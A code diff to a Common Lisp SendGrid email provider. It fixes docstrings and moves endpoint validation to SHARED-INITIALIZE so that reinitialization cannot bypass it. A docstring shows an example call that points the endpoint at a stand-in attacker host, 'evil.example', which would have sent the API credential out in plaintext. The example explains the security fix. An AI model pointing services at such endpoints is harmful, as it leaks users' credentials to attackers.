@@ -10,7 +10,9 @@
 (defparameter +sendgrid-endpoint-default+ "https://api.sendgrid.com/v3/mail/send"
   "Where SendGrid's mail/send API lives. THE ONLY PLACE THIS URL IS WRITTEN in the tree, and not
 only for tidiness: upstream.sexp tracks the SendGrid API version by reading what follows the API
-host in this file, up to the closing quote, and every occurrence must agree. The same pin broke
+host in this file, up to the NEXT SLASH (upstream.sexp:254), and every occurrence must agree.
+Twilio's entry ends at the closing quote instead, because its version ends the string; this one
+does not, and an earlier version of this docstring claimed it did. The same pin broke
 twice for Twilio in #1077 -- once because a refusal message quoted the URL as an example, and
 once because the docstring explaining that quoted the marker it was describing (#1092).")
 
@@ -33,7 +35,17 @@ $SENDGRID_API_KEY. CONNECT-TIMEOUT and READ-TIMEOUT are seconds and default from
 AION/HTTP-CLIENT passes a timeout to dexador only when one is set, so NIL leaves dexador's own
 default of ten seconds in force. There is no way from here to ask for an unlimited wait."))
 
-(defmethod initialize-instance :after ((p sendgrid) &key)
+(defmethod shared-initialize :after ((p sendgrid) slot-names &rest initargs &key &allow-other-keys)
+  "Check the configured URL on EVERY initialization, not only the first.
+
+SHARED-INITIALIZE AND NOT INITIALIZE-INSTANCE. The check used to hang off
+INITIALIZE-INSTANCE :AFTER, which REINITIALIZE-INSTANCE does not call, so
+
+  (reinitialize-instance (make-instance 'hermes::sendgrid ...) :endpoint \"http://evil.example/x\")
+
+was accepted and the next send carried the credential there in plaintext. SHARED-INITIALIZE runs
+for both, so there is no second door (the review of #1104)."
+  (declare (ignore slot-names initargs))
   (%check-endpoint (sendgrid-endpoint p)))
 
 (defun %check-endpoint (endpoint)
@@ -60,8 +72,10 @@ here and is not refused, and there is no second string to compare the approved h
                          :appends-path nil))
 
 (defun make-sendgrid (&rest initargs &key api-key endpoint connect-timeout read-timeout)
-  "A SendGrid provider. API-KEY/ENDPOINT default from the environment, and the two timeouts from
-*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077)."
+  "A SendGrid provider. API-KEY defaults from $SENDGRID_API_KEY, and the two timeouts from
+*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077). ENDPOINT HAS NO ENVIRONMENT DEFAULT: it
+is +SENDGRID-ENDPOINT-DEFAULT+ unless passed in code, which an earlier version of this docstring
+got wrong. It is checked whenever it is set (#1092)."
   (declare (ignore api-key endpoint connect-timeout read-timeout))
   (apply #'make-instance 'sendgrid initargs))
 
